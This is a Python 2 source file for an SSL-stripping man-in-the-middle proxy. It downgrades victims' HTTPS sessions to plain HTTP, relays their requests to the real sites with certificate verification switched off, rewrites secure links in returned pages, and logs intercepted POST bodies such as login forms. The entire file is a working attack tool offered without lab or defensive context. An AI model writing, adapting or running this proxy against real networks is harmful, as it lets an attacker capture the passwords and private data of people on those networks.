from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import httplib
import ssl
import urlparse
import gzip
from StringIO import StringIO
import errno

ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 80


class SSLStripProxy(BaseHTTPRequestHandler):
    def __init__(self, request, client_address, server):
        BaseHTTPRequestHandler.__init__(self, request, client_address, server)

    def do_GET(self):
        host = self.headers.getheader('Host', '')
        url = "https://{}{}".format(host, self.path)
        print "[+] Victim requested:", url

        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Accept-Encoding": "identity",  # Disable compression
                "Host": host
            }

            # Follow up to 5 redirects internally
            for _ in range(5):
                parsed = urlparse.urlparse(url)
                conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
                path = parsed.path or "/"
                if parsed.query:
                    path += "?" + parsed.query

                conn.request("GET", path, headers=headers)
                resp = conn.getresponse()
                status = resp.status
                location = resp.getheader('Location', '')
                content = resp.read()
                content_encoding = resp.getheader('Content-Encoding', '')

                # Handle gzip
                if content_encoding == 'gzip':
                    buf = StringIO(content)
                    f = gzip.GzipFile(fileobj=buf)
                    content = f.read()

                # If it's a redirect to HTTPS, follow it internally
                if status in (301, 302, 303, 307, 308) and location.startswith("https://"):
                    print "[*] Following redirect to:", location
                    url = location
                    continue  # Loop again
                else:
                    break  # Final response received

            # Optional: rewrite HTTPS links in content (basic)
            if b"<html" in content.lower():
                try:
                    content = content.replace("https://", "http://")
                except Exception:
                    pass

            # Return final content to client
            self.send_response(200)  # Always respond 200 to client
            content_type = resp.getheader('Content-Type', 'text/html')
            self.send_header("Content-type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()

            try:
                self.wfile.write(content)
                self.wfile.flush()
            except IOError as e:
                if e.errno == errno.EPIPE:
                    print "[!] Broken pipe: client disconnected early"
                else:
                    raise

        except Exception as e:
            self.send_error(502, "SSLStrip failed: {}".format(e))


    def do_HEAD(self):
        host = self.headers.getheader('Host', '')
        url = "https://{}{}".format(host, self.path)
        print "[+] Victim sent HEAD request:", url

        try:
            parsed = urlparse.urlparse(url)
            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Accept-Encoding": "identity",
                "Host": host
            }

            conn.request("HEAD", path, headers=headers)
            resp = conn.getresponse()
            content_type = resp.getheader('Content-Type', 'text/html')
            content_length = resp.getheader('Content-Length', '0')

            self.send_response(resp.status)
            self.send_header("Content-type", content_type)
            self.send_header("Content-Length", content_length)
            self.end_headers()

        except Exception as e:
            self.send_error(502, "SSLStrip failed (HEAD): {}".format(e))

    def do_POST(self):
        host = self.headers.getheader('Host', '')
        url = "https://{}{}".format(host, self.path)
        print "[+] Victim sent POST request:", url

        try:
            # Read content length and body
            content_length = int(self.headers.getheader('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            print "[*] POST data:", post_data

            # Parse the target URL
            parsed = urlparse.urlparse(url)
            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            # Reconstruct headers for forwarding
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Accept-Encoding": "identity",
                "Host": host,
                "Content-Type": self.headers.getheader("Content-Type", "application/x-www-form-urlencoded"),
                "Content-Length": str(len(post_data))
            }

            # Forward the POST
            conn.request("POST", path, body=post_data, headers=headers)
            resp = conn.getresponse()
            content = resp.read()
            content_encoding = resp.getheader('Content-Encoding', '')

            if content_encoding == 'gzip':
                buf = StringIO(content)
                f = gzip.GzipFile(fileobj=buf)
                content = f.read()

            self.send_response(resp.status)
            content_type = resp.getheader('Content-Type', 'text/html')
            self.send_header("Content-type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()

            try:
                self.wfile.write(content)
                self.wfile.flush()
            except IOError as e:
                if e.errno == errno.EPIPE:
                    print "[!] Broken pipe: client disconnected early"
                else:
                    raise

        except Exception as e:
            self.send_error(502, "SSLStrip failed (POST): {}".format(e))


def start_sslstrip_proxy():
    print "[*] Starting SSLStrip proxy on port " + str(ATTACKER_PORT)
    httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
    httpd.serve_forever()